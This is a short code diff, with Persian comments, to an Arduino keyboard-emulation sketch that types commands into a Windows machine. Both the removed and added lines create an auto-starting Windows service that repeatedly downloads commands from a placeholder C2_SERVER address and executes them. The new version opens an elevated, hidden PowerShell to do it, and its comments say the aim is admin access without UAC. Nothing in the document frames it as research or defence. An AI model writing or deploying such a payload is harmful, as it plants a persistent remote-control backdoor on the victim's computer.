@@ -5,7 +5,14 @@ void setup() {
   Keyboard.begin();
   delay(3000);
   
-  // ایجاد سرویس ویندوزی با ارتباط به سرور C2
-  Keyboard.println(F("sc create EvilSvc binPath= \"powershell -nop -c while(1){irm http://C2_SERVER/api?key=$(Get-Random)|iex; sleep 60}\" start= auto"));
-  Keyboard.println(F("sc start EvilSvc"));
+  // باز کردن PowerShell با دسترسی ادمین (بدون UAC)
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+  
+  // ایجاد سرویس مخفی با ارتباط به سرور C2 هر 60 ثانیه
+  Keyboard.println(F("powershell Start-Process powershell -Verb RunAs -ArgumentList '-Command \"sc.exe create C2Service binPath= \\\"cmd /c start /B powershell -WindowStyle Hidden -Command `\\\"while(1){try{iwr -Uri http://C2_SERVER/command -UseBasicParsing|iex; sleep 60}catch{}}`\\\"\\\" start= auto & sc.exe start C2Service\"'"));
 }
+
+void loop() {} 
